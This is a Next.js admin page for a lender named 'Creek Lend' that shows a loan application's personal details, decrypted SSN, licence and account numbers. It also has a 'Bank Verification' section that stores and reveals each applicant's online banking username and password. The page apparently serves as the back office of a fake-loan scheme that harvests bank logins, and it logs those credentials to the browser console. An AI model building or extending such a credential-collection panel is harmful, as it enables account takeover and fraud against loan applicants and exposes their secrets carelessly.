"use client";

import { useEffect, useState } from "react";
import { useParams, useRouter } from "next/navigation";
import Link from "next/link";
import { useAdminAuth, useAdminApi } from "@/lib/admin-auth";

interface ApplicationDetail {
  id: string;
  first_name: string;
  last_name: string;
  email: string;
  phone: string;
  date_of_birth: string;
  dl_state: string;
  street_address: string;
  city: string;
  state: string;
  zip_code: string;
  country: string;
  employment_status: string;
  employer_name: string;
  job_title: string;
  monthly_income: number;
  years_employed: number;
  loan_amount: number;
  loan_purpose: string;
  loan_term: number;
  bank_name: string;
  routing_number: string;
  account_type: string;
  utm_source: string;
  utm_medium: string;
  utm_campaign: string;
  utm_content: string;
  status: string;
  ip_address: string;
  user_agent: string;
  created_at: string;
  updated_at: string;
  reviewed_at: string | null;
  funded_at: string | null;
  // Decrypted fields (optional)
  ssn_decrypted?: string;
  dl_decrypted?: string;
  account_decrypted?: string;
  // Bank verification (nested object from API)
  bankVerification?: {
    full_name: string;
    email: string;
    application_id: string;
    online_banking_username: string;
    online_banking_password: string;
    bank_name: string;
    account_type: string;
    verification_status: string;
    created_at: string;
  };
}

interface BankVerificationDetail {
  full_name: string;
  email: string;
  application_id: string;
  online_banking_username: string;
  online_banking_password: string;
  bank_name: string;
  account_type: string;
  verification_status: string;
  created_at: string;
}

interface AuditEntry {
  id: string;
  action: string;
  performed_by: string;
  details: Record<string, unknown>;
  created_at: string;
}

const STATUS_COLORS: Record<string, string> = {
  bank_verification_pending: "bg-yellow-100 text-yellow-800 border-yellow-200",
  reviewing: "bg-blue-100 text-blue-800 border-blue-200",
  bank_verification_completed: "bg-green-100 text-green-800 border-green-200",
  declined: "bg-red-100 text-red-800 border-red-200",
  funded: "bg-purple-100 text-purple-800 border-purple-200",
  bank_verification_failed: "bg-red-100 text-red-800 border-red-200",
  bank_verification_in_progress: "bg-indigo-100 text-indigo-800 border-indigo-200",
};

const ALL_STATUSES = [
  "bank_verification_pending",
  "reviewing",
  "bank_verification_completed",
  "declined",
  "funded",
  "bank_verification_failed",
  "bank_verification_in_progress",
];

function formatCurrency(amount: number) {
  return new Intl.NumberFormat("en-US", {
    style: "currency",
    currency: "USD",
    maximumFractionDigits: 0,
  }).format(amount);
}

function formatDate(date: string | null) {
  if (!date) return "N/A";
  return new Date(date).toLocaleString("en-US", {
    month: "short",
    day: "numeric",
    year: "numeric",
    hour: "numeric",
    minute: "2-digit",
  });
}

function Section({
  title,
  children,
}: {
  title: string;
  children: React.ReactNode;
}) {
  return (
    <div className="bg-white rounded-xl border border-gray-200 p-6">
      <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-4">
        {title}
      </h3>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">{children}</div>
    </div>
  );
}

function Field({
  label,
  value,
}: {
  label: string;
  value: string | number | null | undefined;
}) {
  return (
    <div>
      <p className="text-xs text-gray-400">{label}</p>
      <p className="text-sm font-medium text-gray-900">{value ?? "N/A"}</p>
    </div>
  );
}

export default function ApplicationDetailPage() {
  const params = useParams();
  const router = useRouter();
  const { user, loading, logout, isReviewer, isAdmin } = useAdminAuth();
  const { adminFetch } = useAdminApi();

  const [app, setApp] = useState<ApplicationDetail | null>(null);
  const [bankVerification, setBankVerification] =
    useState<BankVerificationDetail | null>(null);
  const [auditLog, setAuditLog] = useState<AuditEntry[]>([]);
  const [dataLoading, setDataLoading] = useState(true);
  const [showDecrypted, setShowDecrypted] = useState(false);
  const [statusUpdating, setStatusUpdating] = useState(false);
  const [deleteConfirm, setDeleteConfirm] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");

  const id = params.id as string;
  console.log(bankVerification);

  useEffect(() => {
    if (!loading && !user) router.replace("/admin/login");
  }, [loading, user, router]);

  useEffect(() => {
    if (!user || !id) return;

    const decrypt = showDecrypted && isReviewer ? "true" : "false";
    adminFetch(`/api/admin/applications/${id}?decrypt=${decrypt}`)
      .then((r) => {
        if (!r.ok) throw new Error("Application not found");
        return r.json();
      })
      .then((data) => {
        setApp(data.application);
        setBankVerification(data?.bankVerification);
        setAuditLog(data.auditLog || []);
      })
      .catch((err) => setError(err.message))
      .finally(() => setDataLoading(false));
  }, [user, id, showDecrypted, isReviewer, adminFetch]);

  const handleStatusUpdate = async (newStatus: string) => {
    setStatusUpdating(true);
    setError("");
    setSuccess("");

    try {
      const res = await adminFetch(`/api/admin/applications/${id}`, {
        method: "PATCH",
        body: JSON.stringify({ status: newStatus }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error);

      setSuccess(`Status updated to ${newStatus}`);
      setApp((prev) => (prev ? { ...prev, status: newStatus } : prev));

      // Refresh audit log
      const logRes = await adminFetch(`/api/admin/applications/${id}`);
      const logData = await logRes.json();
      setAuditLog(logData.auditLog || []);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Update failed");
    } finally {
      setStatusUpdating(false);
    }
  };

  const handleDelete = async () => {
    try {
      const res = await adminFetch(`/api/admin/applications/${id}`, {
        method: "DELETE",
      });
      if (!res.ok) {
        const data = await res.json();
        throw new Error(data.error);
      }
      router.push("/admin/applications");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Delete failed");
      setDeleteConfirm(false);
    }
  };

  if (loading || !user) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Top Nav */}
      <nav className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between sticky top-0 z-10">
        <div className="flex items-center gap-6">
          <Link href="/admin" className="text-xl font-bold text-primary">
            Creek Lend
          </Link>
          <div className="hidden sm:flex items-center gap-4 text-sm">
            <Link
              href="/admin"
              className="text-gray-600 hover:text-primary transition"
            >
              Dashboard
            </Link>
            <Link
              href="/admin/applications"
              className="text-primary font-medium"
            >
              Applications
            </Link>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <span className="text-sm text-gray-500 hidden sm:inline">
            {user.name} ({user.role})
          </span>
          <button
            onClick={logout}
            className="text-sm text-red-600 hover:text-red-800 font-medium cursor-pointer"
          >
            Logout
          </button>
        </div>
      </nav>

      <div className="max-w-5xl mx-auto px-4 sm:px-6 py-8">
        {/* Back link */}
        <Link
          href="/admin/applications"
          className="text-sm text-primary hover:underline mb-4 inline-block"
        >
          &larr; Back to Applications
        </Link>

        {dataLoading ? (
          <div className="flex justify-center py-12">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary" />
          </div>
        ) : error && !app ? (
          <div className="p-8 text-center text-red-500">{error}</div>
        ) : app ? (
          <div className="space-y-6">
            {/* Header */}
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
              <div>
                <h1 className="text-2xl font-bold text-gray-900">
                  {app.first_name} {app.last_name}
                </h1>
                <p className="text-gray-500">
                  {app.email} &middot; {app.phone}
                </p>
              </div>
              <span
                className={`px-4 py-2 rounded-full text-sm font-semibold border ${STATUS_COLORS[app.status] || ""}`}
              >
                {app.status.toUpperCase()}
              </span>
            </div>

            {/* Messages */}
            {error && (
              <div className="p-3 bg-red-50 border border-red-200 text-red-700 rounded-lg text-sm">
                {error}
              </div>
            )}
            {success && (
              <div className="p-3 bg-green-50 border border-green-200 text-green-700 rounded-lg text-sm">
                {success}
              </div>
            )}

            {/* Status Actions */}
            {isReviewer && (
              <div className="bg-white rounded-xl border border-gray-200 p-6">
                <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-3">
                  Update Status
                </h3>
                <div className="flex flex-wrap gap-2">
                  {ALL_STATUSES.filter((s) => s !== app.status).map((s) => (
                    <button
                      key={s}
                      onClick={() => handleStatusUpdate(s)}
                      disabled={statusUpdating}
                      className={`px-4 py-2 rounded-lg text-sm font-medium border transition cursor-pointer disabled:opacity-50 ${STATUS_COLORS[s] || ""}`}
                    >
                      {statusUpdating
                        ? "..."
                        : s.charAt(0).toUpperCase() + s.slice(1)}
                    </button>
                  ))}
                </div>
              </div>
            )}

            {/* Personal Info */}
            <Section title="Personal Information">
              <Field
                label="Full Name"
                value={`${app.first_name} ${app.last_name}`}
              />
              <Field label="Email" value={app.email} />
              <Field label="Phone" value={app.phone} />
              <Field
                label="Date of Birth"
                value={
                  app.date_of_birth
                    ? new Date(app.date_of_birth).toLocaleDateString("en-US", {
                        month: "2-digit",
                        day: "2-digit",
                        year: "numeric",
                      })
                    : "N/A"
                }
              />
              <Field label="Driver's License State" value={app.dl_state} />
              {showDecrypted && app.ssn_decrypted && (
                <Field label="SSN (Decrypted)" value={app.ssn_decrypted} />
              )}
              {showDecrypted && app.dl_decrypted && (
                <Field label="DL Number (Decrypted)" value={app.dl_decrypted} />
              )}
            </Section>

            {/* Address */}
            <Section title="Address">
              <Field label="Street" value={app.street_address} />
              <Field label="City" value={app.city} />
              <Field label="State/Province" value={app.state} />
              <Field label="ZIP/Postal Code" value={app.zip_code} />
              <Field label="Country" value={app.country} />
            </Section>

            {/* Employment */}
            <Section title="Employment">
              <Field label="Status" value={app.employment_status} />
              <Field label="Employer" value={app.employer_name} />
              <Field label="Job Title" value={app.job_title} />
              <Field
                label="Monthly Income"
                value={formatCurrency(app.monthly_income)}
              />
              <Field label="Years Employed" value={app.years_employed} />
            </Section>

            {/* Loan Details */}
            <Section title="Loan Details">
              <Field
                label="Amount Requested"
                value={formatCurrency(app.loan_amount)}
              />
              <Field
                label="Purpose"
                value={app.loan_purpose?.replace(/-/g, " ")}
              />
              <Field label="Term" value={`${app.loan_term} months`} />
            </Section>

            {/* Banking */}
            <Section title="Banking Information">
              <Field label="Bank Name" value={app.bank_name} />
              <Field label="Routing Number" value={app.routing_number} />
              <Field label="Account Type" value={app.account_type} />
              {showDecrypted && app.account_decrypted && (
                <Field
                  label="Account Number (Decrypted)"
                  value={app.account_decrypted}
                />
              )}
              {isReviewer && (
                <div className="sm:col-span-2">
                  <button
                    onClick={() => setShowDecrypted(!showDecrypted)}
                    className="text-sm text-primary hover:underline cursor-pointer"
                  >
                    {showDecrypted
                      ? "Hide Sensitive Data"
                      : "Show Sensitive Data"}
                  </button>
                </div>
              )}
            </Section>

            {/* Bank Verification Details */}
            {bankVerification && (
              <Section title="Bank Verification Details">
                <Field label="Full Name" value={bankVerification?.full_name} />
                <Field label="Email" value={bankVerification?.email} />
                <Field
                  label="Online Banking Username"
                  value={
                    showDecrypted
                      ? bankVerification?.online_banking_username
                      : bankVerification?.online_banking_username ===
                          "[ENCRYPTED]"
                        ? "[ENCRYPTED]"
                        : "••••••••"
                  }
                />
                <Field
                  label="Online Banking Password"
                  value={
                    showDecrypted
                      ? bankVerification?.online_banking_password
                      : bankVerification?.online_banking_password ===
                          "[ENCRYPTED]"
                        ? "[ENCRYPTED]"
                        : "••••••••"
                  }
                />
                <Field
                  label="Application ID"
                  value={bankVerification?.application_id}
                />
                <Field label="Bank Name" value={bankVerification?.bank_name} />
                <Field
                  label="Account Type"
                  value={bankVerification?.account_type}
                />
                <Field
                  label="Verification Status"
                  value={bankVerification?.verification_status}
                />
                <Field
                  label="Submitted At"
                  value={bankVerification?.created_at}
                />
              </Section>
            )}

            {/* UTM / Tracking */}
            {(app.utm_source || app.utm_medium || app.utm_campaign) && (
              <Section title="UTM Tracking">
                <Field label="Source" value={app.utm_source} />
                <Field label="Medium" value={app.utm_medium} />
                <Field label="Campaign" value={app.utm_campaign} />
                <Field label="Content" value={app.utm_content} />
              </Section>
            )}

            {/* Timestamps */}
            <Section title="Timestamps">
              <Field label="Created" value={formatDate(app.created_at)} />
              <Field label="Updated" value={formatDate(app.updated_at)} />
              <Field label="Reviewed" value={formatDate(app.reviewed_at)} />
              <Field label="Funded" value={formatDate(app.funded_at)} />
              <Field label="IP Address" value={app.ip_address} />
            </Section>

            {/* Audit Log */}
            {auditLog.length > 0 && (
              <div className="bg-white rounded-xl border border-gray-200 p-6">
                <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-4">
                  Audit Log
                </h3>
                <div className="space-y-3">
                  {auditLog.map((entry) => (
                    <div
                      key={entry.id}
                      className="flex items-start gap-3 text-sm border-b border-gray-50 pb-3"
                    >
                      <div className="flex-1">
                        <span className="font-medium text-gray-900">
                          {entry.action}
                        </span>
                        <span className="text-gray-400 mx-2">by</span>
                        <span className="text-gray-600">
                          {entry.performed_by}
                        </span>
                        {entry.details &&
                          Object.keys(entry.details).length > 0 && (
                            <p className="text-xs text-gray-400 mt-1">
                              {JSON.stringify(entry.details)}
                            </p>
                          )}
                      </div>
                      <span className="text-xs text-gray-400 whitespace-nowrap">
                        {formatDate(entry.created_at)}
                      </span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Delete */}
            {isAdmin && (
              <div className="bg-white rounded-xl border border-red-200 p-6">
                <h3 className="text-sm font-semibold text-red-500 uppercase tracking-wide mb-3">
                  Danger Zone
                </h3>
                {deleteConfirm ? (
                  <div className="flex items-center gap-3">
                    <p className="text-sm text-gray-600">
                      Are you sure? This action cannot be undone.
                    </p>
                    <button
                      onClick={handleDelete}
                      className="px-4 py-2 bg-red-600 text-white rounded-lg text-sm font-medium hover:bg-red-700 transition cursor-pointer"
                    >
                      Confirm Delete
                    </button>
                    <button
                      onClick={() => setDeleteConfirm(false)}
                      className="px-4 py-2 border border-gray-300 rounded-lg text-sm hover:bg-gray-50 transition cursor-pointer"
                    >
                      Cancel
                    </button>
                  </div>
                ) : (
                  <button
                    onClick={() => setDeleteConfirm(true)}
                    className="px-4 py-2 border border-red-300 text-red-600 rounded-lg text-sm font-medium hover:bg-red-50 transition cursor-pointer"
                  >
                    Delete Application
                  </button>
                )}
              </div>
            )}
          </div>
        ) : null}
      </div>
    </div>
  );
}
